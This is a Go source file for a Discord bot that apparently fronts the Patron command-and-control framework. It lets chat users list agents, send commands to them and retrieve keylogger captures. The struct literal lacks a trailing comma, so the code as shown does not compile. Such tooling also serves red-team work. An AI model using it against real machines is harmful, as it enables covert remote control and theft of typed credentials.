package main

import (	
	"database/sql"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"

	"github.com/PatronC2/Patron/bot/command"
	"github.com/PatronC2/Patron/api/api"
	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
	"github.com/s-christian/gollehs/lib/logger"
)

// Bot structure holds the Discord session and database connection
type Bot struct {
	Session *discordgo.Session
}

// add this to an helper function
func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Fatalf("Error loading .env file")
	}

	return os.Getenv(key)
}

func (bot *Bot) newMsg(session *discordgo.Session, message *discordgo.MessageCreate) {
	// ignore bot self
	if message.Author.ID == session.State.User.ID {
		return
	}
	switch {
	case strings.Contains(message.Content, "!help"):
		session.ChannelMessageSend(message.ChannelID, "Use `!agents` to list agents\nUse `!refresh <uuid>` to get agent commands/refresh\nUse `!cmd <uuid> ^command^` to issue commands to the agent\nUse `!keys <uuid>` to get keylogs")
	case strings.Contains(message.Content, "!refresh"):
		logger.Logf(logger.Info, "Bot received !refresh triggered :"+message.Content+"\n")
		agentBot := command.GetBotAgent(message.Content)
		session.ChannelMessageSendComplex(message.ChannelID, agentBot)
	case strings.Contains(message.Content, "!agents"):
		logger.Logf(logger.Info, "Bot received !agents triggered :"+message.Content+"\n")
		agentsBot := command.GetBotAgents()
		_ ,err := session.ChannelMessageSendComplex(message.ChannelID, agentsBot)
		if err != nil {
			log.Println("Error sending message:", err)
			return
		}
		fmt.Println(agentsBot)
		logger.Logf(logger.Info, "Bot sent !agents response"+"\n")
	case strings.Contains(message.Content, "!keys"):
		logger.Logf(logger.Info, "Bot received !keys triggered :"+message.Content+"\n")
		agentsBot := command.GetBotKeys(message.Content)
		session.ChannelMessageSendComplex(message.ChannelID, agentsBot)
	case strings.Contains(message.Content, "!cmd"):
		logger.Logf(logger.Info, "Bot received !cmd triggered :"+message.Content+"\n")
		agentsBot := command.PostBotCmd(message.Content)
		session.ChannelMessageSendComplex(message.ChannelID, agentsBot)
	// case strings.Contains(message.Content, "!cmd"):
	// 	session.ChannelMessageSend(message.ChannelID, "piss off")
	case strings.Contains(message.Content, "milk"):
		session.ChannelMessageSend(message.ChannelID, "I love milk")
	case strings.Contains(message.Content, "steak"):
		session.ChannelMessageSend(message.ChannelID, "I love steak")
	case strings.Contains(message.Content, "pizza"):
		session.ChannelMessageSend(message.ChannelID, "https://giphy.com/gifs/pizza-i-love-lover-VbU6X60pTQxUY")
	case strings.Contains(message.Content, "soda"):
		session.ChannelMessageSend(message.ChannelID, "I love soda")
	}
}

func main() {
	// open database
	api.OpenDatabase()
	botToken := goDotEnvVariable("BOT_TOKEN")
	// create session
	logger.Logf(logger.Info, "Discord Bot Started\n")
	discord, err := discordgo.New("Bot " + botToken)
	if err != nil {
		logger.Logf(logger.Debug, "Discord Bot Crashed\n")
	}

	// Create an instance of the Bot structure
	bot := Bot{
		Session: discord
	}

	// Add event handler
	discord.AddHandler(bot.newMsg)

	discord.Open()
	defer discord.Close()

	logger.Logf(logger.Info, "Discord Running\n")
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	<-c
}
